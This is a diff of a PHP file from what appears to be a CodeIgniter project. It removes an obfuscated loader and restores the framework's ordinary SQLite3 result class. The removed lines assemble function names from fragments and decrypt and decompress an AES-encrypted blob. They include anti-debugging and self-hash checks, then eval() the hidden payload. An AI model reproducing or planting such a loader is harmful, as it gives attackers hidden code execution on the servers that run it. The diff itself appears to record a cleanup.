@@ -1,28 +1,173 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_bu48rrh9=('bas'.'e64'.'_de'.'cod'.'e');
-$_srnuanc7=('gzu'.'nco'.'mpr'.'ess');
-$_c1vw4v5x=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_vcfhwxi6='bkfQPAwO';
-$_alik74gy='3FeKoXOD';
-$_bg6xqg39='4TG1GSMh';
-$_ors6x5l2='B782EU5bky0=';
-$_bmyfu86n='br+c3bcq';
-$_obdipmf5='zfURS9rP';
-$_l3830wcq='JYnsog==';
-$_bbzau8vo='uBw94f6x';
-$_b7is9yra=$_bu48rrh9($_alik74gy.$_bmyfu86n.$_bg6xqg39.$_vcfhwxi6.$_ors6x5l2);
-$_xavor103=$_bu48rrh9($_obdipmf5.$_bbzau8vo.$_l3830wcq);
-$_cwcu3mxz=$_bu48rrh9('afV9sriiwwDWDxMc2JST9VHBz0AIm07YnDN5AcJDRDQIOwlpG0psyeLn3uBV4O0DTHXPZ8xAnfWGzLe/DYdilg8DecLwm7boXanhZeLLlM3kIS2u8/PQdbz8kZhyICS84ivUyfnnP1/zZQv1hM5jEaq9VOD7SHuA7GgybfL9xtmY8WWpAqjBwtdVX9SZa3lnJLgQUkRDBW9Wq6uq7gqU7O1xV8gSoruDFUPc2rxwlTgvrVuNHIHG6A45aHTiBYz2aRmynLccDOlbxhm2ql3aeWBNGjs7httIv5+/pOh7+SDkaaIgH8nx7HmppLUBAY11orANuTwrgZEmAK1C6szQFIVwg0bzFYbp+8eAAc/Y+a6tyHDWiF+rp+tKpNx4fBcP0M1X9CBiVFW+Fc+lFTHg8cQG6Grchvzo5FfnEyVNwfnKvY2wiVmc6QademDBVtLrAkgGaGBPBkvToqhb+PXSchpU5FoZownmpUbkN2bUyTHVAFDUNlOLRg2BlcfQVqUMBdCf2zl1nCgpHKLKTQ4QTBA3gXfZMA8/ghtO8Dp0D8QcynGW8/msmCnkUjVQDwSGTKEfyI8vtXVHbz8vInEd+VTGaxM4NBZzU/oEzy4+Rb9/ZSIVzZiTlvSI4GAGlk65P6/FGvWIAj+AZOf3jCsbqUK0am/1B8yL1S7Mv8iUSrG/KzZBd206pFowV5rI0mtVdXxsGaQCbfVdLZtHqSLQN6Lt7cdhyy8T6g3JZHwEJE85bkT1UPE3V4pW+gEGnuTMSdaXynRcn4JHC/u8IB7u4UaDFqaLubddDqMCd/+tKii3U2JyEhuKjN5YYgqxJ5yXGxq0unxIHVfFBVDehwejEQ==');
-$_gvyugj4e=$_c1vw4v5x($_cwcu3mxz,'aes-256-cbc',$_b7is9yra,OPENSSL_RAW_DATA,$_xavor103);
-if($_gvyugj4e===false){exit;}
-$_qlm7xf5s=$_srnuanc7($_gvyugj4e);
-if($_qlm7xf5s===false){exit;}
-$_dzkg4x07='a5888f9bfbc47c2c1dc9bec38c02b2580d9a601a7eebdabfbf00e71da64aef16';
-$_v4f2zjqx=@file_get_contents(__FILE__);
-if($_v4f2zjqx!==false){
-$_gkulpodr=str_replace($_dzkg4x07,"0000000000000000000000000000000000000000000000000000000000000000",$_v4f2zjqx);
-$_yd45n2yc=hash("sha256",$_gkulpodr);
-if($_yd45n2yc!==$_dzkg4x07){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_DB_sqlite3_result extends CI_DB_result {
+
+
+
+
+
+public function num_fields()
+{
+return $this->result_id->numColumns();
 }
-eval($_qlm7xf5s);
+
+
+
+
+
+
+
+
+public function list_fields()
+{
+$field_names = array();
+for ($i = 0, $c = $this->num_fields(); $i < $c; $i++)
+{
+$field_names[] = $this->result_id->columnName($i);
+}
+return $field_names;
+}
+
+
+
+
+
+
+
+
+public function field_data()
+{
+static $data_types = array(
+SQLITE3_INTEGER => 'integer',
+SQLITE3_FLOAT => 'float',
+SQLITE3_TEXT => 'text',
+SQLITE3_BLOB => 'blob',
+SQLITE3_NULL => 'null'
+);
+$retval = array();
+for ($i = 0, $c = $this->num_fields(); $i < $c; $i++)
+{
+$retval[$i] = new stdClass();
+$retval[$i]->name = $this->result_id->columnName($i);
+$type = $this->result_id->columnType($i);
+$retval[$i]->type = isset($data_types[$type]) ? $data_types[$type] : $type;
+$retval[$i]->max_length = NULL;
+}
+return $retval;
+}
+
+
+
+
+
+
+public function free_result()
+{
+if (is_object($this->result_id))
+{
+$this->result_id->finalize();
+$this->result_id = NULL;
+}
+}
+
+
+
+
+
+
+
+
+protected function _fetch_assoc()
+{
+return $this->result_id->fetchArray(SQLITE3_ASSOC);
+}
+
+
+
+
+
+
+
+
+
+protected function _fetch_object($class_name = 'stdClass')
+{
+
+if (($row = $this->result_id->fetchArray(SQLITE3_ASSOC)) === FALSE)
+{
+return FALSE;
+}
+elseif ($class_name === 'stdClass')
+{
+return (object) $row;
+}
+$class_name = new $class_name();
+foreach (array_keys($row) as $key)
+{
+$class_name->$key = $row[$key];
+}
+return $class_name;
+}
+
+
+
+
+
+
+
+
+
+
+
+public function data_seek($n = 0)
+{
+
+return ($n > 0) ? FALSE : $this->result_id->reset();
+}
+}
